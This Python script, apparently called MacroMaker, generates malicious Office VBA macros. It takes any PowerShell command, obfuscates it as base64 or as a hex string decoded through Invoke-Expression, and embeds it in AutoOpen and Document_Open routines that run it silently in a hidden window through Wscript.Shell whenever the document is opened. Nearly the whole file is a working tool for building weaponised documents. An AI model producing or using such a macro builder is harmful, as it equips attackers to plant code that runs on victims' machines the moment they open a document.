#!/usr/bin/env python 

import base64
import argparse
import sys
import os
class  Maker_Code:
       def __init__(self):
           self.control()
           self.MAKE_DO()
       def  MAKE_DO(self):
            if self.args.Command and self.args.Name and not self.args.read:
                   pass
            elif self.args.read and self.args.Name and not self.args.Command:
                   pass
            else:
                 print("\n[+] usage: MacroMaker.py [-h] -c C -n NAME")
                 print("[+] MacroMaker.py: error: the following arguments are required")
                 print("[+] use -C/--Command or -r/--read")
                 print("[+] use -h to see help options")
                 exit()
            if self.args.read :
               with open(self.args.read,'r') as file_Command :
                      read_file = file_Command.read()
                      payload = read_file
            else:                
                 payload = self.args.Command
            String_len = 54
            Do=""
            if self.args.hex:
               Command1 = payload.encode().hex()+"'"
               Command ="".join(" %s"%Command1 [i:i+2] for i in range(0, len(Command1 ), 2))
               Command1= "".join('\n\t" %s"& _'%Command[i:i+81] for i in range(1, len(Command),81))
               with open('.output','a') as output:
                         write_out = output.write(Command1.replace(' "& _','"& _').replace(" '","'").replace('" ','"',1))
               with open('.output','r') as output:
                         Command1 = output.read()
                   
               Command2 = ('Hex ="powershell.exe $hexString ='+"'"+'"& _\n'+ Command1).replace("\n",'',1).replace("\t\t",'',1).replace(' "','"').strip()
               Convert  = '"'+";$hexString.Split(' ') | forEach {[char]([convert]::toint16($_,16))}"+'"& _\n'
               Convert  += '''\t"| forEach {$result = $result + $_};Set-Variable -Name 'ROT' -Value ($result);Invoke-Expression $ROT "'''
               Do +='\t'+Command2+'\n\t'+Convert
               os.remove('.output')
            else:
                Command  = "powershell -e " + base64.b64encode(payload.encode('utf-16')[2:]).decode()
                for i in range(0,len(Command),String_len):            
                    Commandloop = "Str= str+" + '"' + Command[i:i+String_len] +'"'+'\n'
                    Do +='\t'+Commandloop
            with open ("MacroStore/"+self.args.Name+".txt",'w') as Macro_File :
                        Micro_write = Macro_File.write("Sub "+"AutoOpen"+"()"+'\n'+"'\n'\n"\
                        +"AutoOpen"+"Macro"+"\n'\n'\n"+"End Sub"+'\n'+"Sub Document_Open()"\
                        +'\n'+"    "+"AutoOpen"+"Macro"+'\n'+"End Sub"+'\n'+"Sub "+"AutoOpen"+"Macro()\n")
                       
            if self.args.hex:
                   with open ("MacroStore/"+self.args.Name+".txt",'a') as Macro_File :
                            Micro_write = Macro_File.write("\tDim Hex As String\n"+f'{Do}'+'\n'+\
                                         '\tSet WshShell = CreateObject("Wscript.Shell")'+\
                                           '\n\tWshShell.Run Hex, 0, True'+'\nEnd Sub')
                                 
            else:
                with open ("MacroStore/"+self.args.Name+".txt",'a') as Macro_File :  
                          Micro_write = Macro_File.write("\tDim Str As String\n"+f'{Do}'+\
                                      '\tCreateObject("Wscript.shell").Run Str , 0, True \n'+"End Sub\n")
                       
            with open ("MacroStore/"+self.args.Name+".txt",'r') as Macro_File : 
                       Macro_read =  Macro_File.read()
            print(Macro_read)
       def control(self):    
         parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -n ] [arguments]")       
         parser.add_argument( "-c","--Command",help ="PowerShell Command ") 
         parser.add_argument( "-n","--Name"   ,help ="Name of the Macto output ")  
         parser.add_argument( "-r","--read"   ,help ="read the command from file ")
         parser.add_argument( "--hex",action='store_true',help ="generate the Macros in  hex format")     
         self.args = parser.parse_args()        
         if len(sys.argv)!=1 :
            pass
         else:
            parser.print_help()         
            exit()
if __name__=='__main__':
   Maker_Code()
